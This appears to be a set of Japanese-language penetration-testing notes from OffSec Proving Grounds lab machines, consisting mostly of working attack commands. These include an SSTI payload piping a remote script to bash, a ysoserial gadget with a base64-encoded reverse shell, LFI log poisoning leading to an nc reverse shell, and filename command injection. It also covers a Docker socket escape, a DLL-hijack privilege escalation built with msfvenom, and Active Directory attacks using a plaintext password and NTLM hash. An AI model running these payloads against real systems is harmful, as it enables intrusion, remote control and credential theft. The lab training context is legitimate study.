...
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest -Uri "http://example.com/hello.exe" -OutFile "C:\Users\Public\hello.exe"; Start-Process "C:\Users\Public\hello.exe"
...
rdesktop -u offsec -p lab -a 16 -P -z -b -g 1280x860 192.168.167.10
...
```
PHPリバースシェルはPHP Ivan Sincekが安定している

DNSの探索
dig @192.168.247.196 -x 192.168.247.196
dig axfr @192.168.247.196 matrimony.off
...
PAYLOAD
{
  "username": "{{ config.__class__.from_envvar.__globals__.import_string('os').popen('curl 192.168.45.228/rev.sh | bash').read() }}",
  "public_id": "07e2f40d-e8b7-47d7-bd9e-33c8e38751b0",
  "exp": 1725687986
}
https://al1z4deh.medium.com/proving-grounds-rookie-mistake-b74eca98edf1
```
...
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     ...
     -jar ysoserial-all.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIwMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > recycler2.ser
...
```
以下のLFIがあったとする
http://192.168.45.218/dashboard.php?show=completed&ext=../../../../../etc/passwd

apache2のログを取得してアクセスできることを確認
http://192.168.45.218/dashboard.php?show=completed&ext=../../../../../var/log/apache2/access.log

ncでapache2のログにRCE用のコードを設置する
nc 192.168.60.216 80
GET /<?php system($_GET['cmd']); ?>

以下のペイロードでリバースシェルを取得する
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f

最終的なペイロード
http://192.168.45.218/dashboard.php?show=completed&ext=../../../../../var/log/apache2/access.log&cmd=rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.49.60%20443%20%3E%2Ftmp%2Ff
```

### phpファイルのアップロードを許可するように書き換える

```
echo "AddType application/x-httpd-php .dork" > .htaccess
```

最後にリバースシェル.phpをdork形式に変更してアップロードする

```
mv shell.php shell.dork
```

### PHPのsystem関数をいじれる場合のRCE

```
以下のようなサニタイズされていないsystem関数があるとする
system("/usr/bin/clamscan $name");

リバースシェルのbase64を作成する
echo "bash -i >& /dev/tcp/192.168.xx.xx/443 0>&1" | base64

以下のファイルを作成してアップロードする
test.jpeg || echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTcwLzQ0NDQgMD4mMQo= | base64 -d | bash
```
...
```
$ curl --path-as-is http://192.168.212.181:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

dbファイルを見つけたらsqlite3で調べていく
...
```
ネットワーク構成にdocker0がある
→netstat -anoでdockerの接続先を確認する(ここでは172.17.0.2)

ターゲットシェル内で以下コマンドでアクセス
$ssh -l root 172.17.0.2

※コンテナのルート権限を持っている場合に最初に確認することの 1 つは、docker.sock にアクセスできるかどうか
以下でdocker.sockを探す
$find / -name "docker.sock" 2>/dev/null

元のシェルに戻ってdockerバイナリをインポートする
#which docker
/usr/bin/docker
#cp /usr/bin/docker .
python3 -m http.server

dockerのシェルに戻ってdockerをダウンロードする、そして以下のコマンド実行
./docker -H unix:///run/docker.sock images
./docker -H unix:///run/docker.sock run -it -v /root:/mnt 3f4714ee068a(コンテナID) bash

/mnt フォルダーをチェックして、/root ディレクトリがこの新しいコンテナーに正常にマウントされたかどうかを確認
cd mnt
cat proof.txt
...
```
rsync -avh rsync://192.168.178.234:873/source .
```
...
### SeManageVolumePrivilegeからdllハイジャックして権限昇格する

```
実行後、Cドライブに書き込みすることができるようになる
ertutil.exe -urlcache -split -f http://192.168.45.206:81/SeManageVolumeExploit.exe
...
この状態で、c:\windows\system32\wbemにtzres.dllというリバースシェルを設置する
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=135 -f dll -o tzres.dll

そして最後にsysteminfoを実行することで、tzres.dllが発火してリバースシェルが実行される
...
mssqlがある場合は、チケットを要求してメモリに保存し、ハッシュ解析を行う
...
./kerbrute_linux_386 userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d access.offsec --dc 192.168.156.187
...
#### kali上からbloodhoundを実行する

```
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.121.40
```
...
kaliに戻って以下実行
python3 rbcd.py -dc-ip 192.168.121.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
